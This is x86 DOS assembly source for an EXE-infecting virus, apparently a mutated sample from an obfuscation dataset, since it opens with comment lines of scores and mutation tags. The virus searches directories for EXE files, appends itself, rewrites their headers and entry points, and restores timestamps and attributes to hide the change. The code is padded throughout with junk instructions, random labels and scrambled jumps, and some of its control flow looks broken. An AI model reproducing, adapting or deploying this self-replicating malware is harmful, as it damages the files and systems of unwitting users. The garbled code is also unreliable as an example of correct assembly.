;1.14563582963
;UntouchBlock_0
;1.04834763841
;ForcedJMP_1
;0.87901405227
;0.662890848057
;0.709375228352
;0.621321570818
;0.889805153707
;		JNZ 	_1
;1.12188825455
;		JNZ 	_0
;0.741063965404
;0.977720691946
;UntouchBlock_0
;1.02823075169
;0.790375878163
;		JNZ 	_1
;0.747398049352
;UntouchBlock_1
;0.885210573834
;0.722655717586
;0.910259785668
;0.588868345065
;0.915676504451
;NoMutation
;0.719835557859
;		JNZ 	_0
;0.880466066102
;0.390224646037
;0.737017818921
;0.582712039345
;UntouchBlock_1
;0.729260562657
;NoMutation
;0.812485494162
;UntouchBlock_0
;0.722622882795
;0.419954514714
;NoMutation
;0.880881889902
;		JZ 	_0
;0.681569375502
;0.859506497974
;		JNZ 	_0
;0.901632354819
;0.621754016407
;0.596289813825
;UntouchBlock_1
;0.789646686603
;0.641298035711
;UntouchBlock_1
;0.748042535186
;UntouchBlock_0
;0.605072731493
;		JZ 	_1
;0.691296391044
;0.820917440267
;0.873245396846
;ForcedJMP_0
;1.09738617965
;0.66479054492
;0.993027222548
;		JNZ 	_0
;1.01428722054
;		JZ 	_0
;0.695468248182
;0.581543378793
;0.560964857875
;0.688343696154
;		JNZ 	_1
;0.702177308211
;0.552389060855
;0.408265721142
;UntouchBlock_0
;0.575845265787
;0.793212892645
;0.629378939098
;0.844818523335
;1.0218581525
;		JNZ 	_0
;0.554798426363
;0.637109331855
;0.550189043427
;0.706143256989
;ForcedJMP_1
;0.893179230904
;ForcedJMP_1
;0.564962938034
;0.72276598936
;NoMutation
;0.5791935004
;UntouchBlock_0
;0.518115990485
;0.469389929209
;0.513500160944
;NoMutation
;0.490173636371
;0.632866382417
;0.474429042472
;0.636974292007
;0.415566824206
;UntouchBlock_0
;0.494522303509
;		JZ 	_0
;0.491221298517
;0.478291076518
;UntouchBlock_1
;0.424348935847
;		JZ 	_1
;0.425917635836
;		JZ 	_0
;0.363936253689
;ForcedJMP_1
;0.300908742932
;0.575094697457
;		JZ 	_0
;0.352002058421
;0.412098941969
;0.587870659767
;		JZ 	_0
;0.510726735665
;		JNZ 	_0
;0.328654002785
;0.400385663749
;NoMutation
;0.357963875395
;0.426198686457
;0.475706062617
;0.350001355261
;ForcedJMP_0
;0.428957414791
;0.344417942302
;0.313474127158
;0.323301951311
;0.300953610302
;0.38978812232
;0.28939517783
;0.47041580758
;UntouchBlock_1
;0.351190827736
;0.33215601076
;0.318308204418
;0.342434849431
;0.342345774017
;0.17560659313
;0.183700945366
;		JNZ 	_1
;0.370618080355
;0.397911478223
;0.245159752624
;0.263425177677
;UntouchBlock_0
;0.170080918288
;0.170498058478
;0.131452803403
;0.17742525367
;0.239960250689
;		JZ 	_0
;0.189219403117
;0.172394335951
;0.149310132175
;ForcedJMP_1
;0.140677978074
;0.150632681914
;		JZ 	_0
;0.117873091039
;ForcedJMP_0
;0.0926816324977
;0.077726247626
;UntouchBlock_1
;		JNZ 	_0
;ForcedJMP_1
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
	 mov ds,ax
ZSGDH:
	 mov dx,OFFSET PGMSTR
	 mov ah,41H
LLNXX:
B_LBO:
	 int 21H 
	 mov ah,4CH
		JMP 	_LKPA
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
_LKPA:
	 mov al,0
EKD__:
OIBVY:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 


VIRUS:
		 push ax
		 mov ax,cs
		 mov ds,ax 						
		 mov ax,es 						
		 mov WORD PTR [OLDDTA+2],ax 	
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
EFFBL:
		call 	 GGNYB
FDAXW:
		call 	 XGMRP
YLGSM:
		call 	 KWNIH


FINISH:  call RESTORE_DTA 	
WVVHX:
		call 	 RANIS
 		 pop ax

REL1: 						
		JMP 	ZQYGA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ZQYGA:
 		 mov ax,HSTACK 				
		JMP 	YLGSM
KWNIH:
 		 cli 
 		 mov ss,ax
		cmp 	ax,dx
JZ XGMRP
JMP FDAXW
XGMRP:
		cmp 	ax,bx
JZ GGNYB
JMP EFFBL
GGNYB:

REL1A: 						
 		 mov sp,OFFSET HSTACK
		cmp 	dx,ax
JNZ LRCOS
JMP IOLMG
LRCOS:
 		 mov es,WORD PTR [OLDDTA+2] 
		cmp 	ax,bx
JZ RANIS
JMP WVVHX
RANIS:
		 mov ds,WORD PTR [OLDDTA+2] 
NEWMZ:
		call 	 RYBOJ
 		 sti 					

REL2:					 			
IOLMG:
		call 	 LRCOS
 		jmp FAR PTR HOST 


FIND_FILE:
	mov al,’\’ 
		JMP 	ZJPSW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZJPSW:
	mov BYTE PTR [USEFILE],al
JNZ RRMVS
JMP CHVLY
RRMVS:
JNZ RYBOJ
JMP NEWMZ
RYBOJ:
	mov si,OFFSET USEFILE+1
	xor dl,dl
	mov ah,47H
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
CHVLY:
		call 	 RRMVS
	mov BYTE PTR [USEFILE],al 

FF2: mov al,2
	mov [LEVEL],al 
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
	inc al 
	mov [LEVEL],al 
J__UI:
		call 	 MCWTV
	call FINDBR 

FF3:
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
		JMP 	GHDEJ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GHDEJ:
	mov di,OFFSET USEFILE 
		cmp 	ax,cx
JNZ MCWTV
JMP J__UI
MCWTV:
		cmp 	cx,ax
JNZ BBHQN
JMP DMDCV
BBHQN:
	mov si,OFFSET ALLFILE 
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
DMDCV:
		call 	 BBHQN
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
		mov bx,OFFSET DTA2+1EH
		mov al,[LEVEL]
		mov dl,2BH 
		mul dl 
		add bx,ax 
		JMP 	QSYK_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
QSYK_:
		mov si,bx
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
WFAPT:
		call 	 GNGQJ
		stosb

FBE1: mov al,1 
	or al,al
	ret

FBE2: pop di 

FBE3: xor al,al 
XSGFB:
		call 	 GGKTA
 	  ret 


FINDEXE:
		mov dx,OFFSET DTA1 
		mov ah,1AH
		JMP 	WFAPT
GNGQJ:
		int 21H
		mov di,OFFSET USEFILE
		JMP 	ONKBS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ONKBS:
		mov si,OFFSET EXEFILE
		call CONCAT 
		push di 
		mov dx,OFFSET USEFILE
		cmp 	ax,cx
JZ GGKTA
JMP XSGFB
GGKTA:
		mov cx,3FH 
		JMP 	IQQQG
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
IQQQG:
		mov ah,4EH
		cmp 	dx,ax
JZ QIWCI
JMP AYRLE
QIWCI:
ZMQZG:
		call 	 QLEAS
AYRLE:
		call 	 QIWCI
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		JMP 	NRCUG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
NRCUG:
		mov di,OFFSET USEFILE
		cmp 	ax,ax
JNZ QLEAS
JMP ZMQZG
QLEAS:
		cmp 	cx,bx
JNZ KHNJI
JMP NSKBU
KHNJI:
		mov si,OFFSET DTA1+1EH
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		mov ah,4FH
		int 21H 
NSKBU:
		call 	 KHNJI
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
	 stc
	 ret

FENC:
	 pop di
	 ret


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov cx,10H 
	 mov ah,4EH 
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
	 int 21H
	 mov ah,4FH
	 int 21H 
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
	 ret 


GET_DTA:
 mov dx,OFFSET DTA2
 mov al,2BH
		cmp 	ax,cx
JZ ANOFP
JMP LVMMS
ANOFP:
 mul [LEVEL]
 add dx,ax 
 ret
SNQZH:
		call 	 RAMLJ


CONCAT:
	 mov al,byte ptr es:[di] 
		cmp 	dx,bx
JZ RAMLJ
JMP SNQZH
RAMLJ:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
LVMMS:
		call 	 ANOFP
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
ZNNNP:
		call 	 CMTBV
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		JMP 	ZNNNP
CMTBV:
		 mov ah,’Z’
JNZ EGDKN
JMP URIGK
EGDKN:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
	     ret 
URIGK:
		call 	 EGDKN


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
	 mov ah,3FH
		JMP 	HACXA
CJNAM:
	 int 21H

RE_RET: ret 


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
	 cmp ax,4*NUMRELS 

HACXA:
		call 	 CJNAM
RR_RET: ret     
JOWQN:
		call 	 _KDV_


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
	 mov cx,dx
		cmp 	cx,ax
JNZ _KDV_
JMP JOWQN
_KDV_:
	 mov dx,ax 
		JMP 	ESITW
JFUCR:
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
		JMP 	KIGIM
DFWKY:
	 mov bx,[HANDLE]
JNZ _UFRR
JMP SLH_L
_UFRR:
	 mov dx,OFFSET VIDC
	 mov cx,2 
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
KIGIM:
		call 	 DFWKY
	 stc 

ESITW:
		call 	 JFUCR
SLH_L:
		call 	 _UFRR
II_RET: ret


SETBDY:
	 mov al,BYTE PTR [FSIZE]
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
		JMP 	PMZGF
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
PMZGF:
	 mov bx,[HANDLE]
	 mov ah,40H 
JQMBG:
		call 	 PZGTY
	 int 21H

SB_E: ret
C_HLJ:
		call 	 BCXPE


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
		cmp 	cx,cx
JZ BCXPE
JMP C_HLJ
BCXPE:
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
JZ PZGTY
JMP JQMBG
PZGTY:
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
AHEIM:
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
ZAYTJ:
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
PV_YT:
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
	 mov bx,[HANDLE]
NVITK:
	 mov cx,4
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
VBLCR:
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
SLBBS:
	 mov cl,4 
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
MOBMI:
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
	 shr bx,cl
	 add ax,bx
	 mov WORD PTR [EXE_HDR+14],ax 
UMAYY:
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
	 mov ax,STACKSIZE 
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
	 shr ax,cl
	 mov cl,7
WCYUL:
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
		JMP 	IH_FH
nop
nop
nop
nop
nop
nop
IH_FH:
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,NUMRELS 
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
		JMP 	FMZZS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
FMZZS:
	 mov ax,WORD PTR [EXE_HDR+6] 
	 dec ax 
	 dec ax 
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
HLMQG:
	 adc dx,bx 
	 mov cx,dx
	 mov dx,ax
	 mov bx,[HANDLE]
NZXKO:
	 mov ax,4200H 
	 int 21H
		JMP 	UHSDB
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
UHSDB:
	 mov ax,WORD PTR [EXE_HDR+22]
RQHXG:
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
	 mov WORD PTR [EXE_HDR+2],ax 
		cmp 	ax,dx
JZ ZPTUA
JMP PASN_
ZPTUA:
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL2
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
	 mov WORD PTR [EXE_HDR+6],ax
		JMP 	PHMPD
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
PHMPD:
	 mov cx,8 
		JMP 	DBUFP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
DBUFP:
	 mov dx,OFFSET EXE_HDR
		cmp 	dx,dx
JZ IGZRP
JMP AOVVU
IGZRP:
	 mov bx,[HANDLE]
		JMP 	ZPVGZ
QZGJM:
	 mov ah,40H 
	 int 21H
	 ret 
ZPVGZ:
		call 	 QZGJM
PASN_:
		call 	 ZPTUA



AOVVU:
		call 	 IGZRP
TIMECT EQU 63 


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;



SETSR:
	 mov al,90H 
	 mov BYTE PTR SR1,al 
QEFBV:
		call 	 JOOQS
	 ret


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
JNZ JOOQS
JMP QEFBV
JOOQS:
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
	 mov ah,1AH
	 int 21H 
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
	 mov ds,ax
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
EFEPH:
		call 	 CEQHE
GHGGT:
		call 	 CMBBO
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
	 mov al,0
		JMP 	GHGGT
CMBBO:
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
	 int 21H
	 mov [HANDLE],ax 
JZ CEQHE
JMP EFEPH
CEQHE:
	 mov ah,57H 
	 xor al,al
	 mov bx,[HANDLE]
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
	 mov ax,WORD PTR [DTA1+28] 
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
	 mov WORD PTR [FSIZE],ax
		cmp 	cx,bx
JNZ _HTOX
JMP WCKWP
_HTOX:
 	 ret
PYKYY:
		call 	 PDYST

KIRKI:
		call 	 OTQRW
WCKWP:
		call 	 _HTOX


REST_ATTRIBUTE:
	 mov dx,[FDATE] 
	 mov cx,[FTIME]
	 mov ah,57H 
		cmp 	bx,ax
JNZ OTQRW
JMP KIRKI
OTQRW:
	 mov al,1
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
	 mov bx,[HANDLE]
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
	 mov ah,43H 
		JMP 	PYKYY
PDYST:
	 mov al,1
	 mov dx,OFFSET USEFILE
JNZ FIKBQ
JMP PSMVD
FIKBQ:
	 int 21H
PSMVD:
		call 	 FIKBQ
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
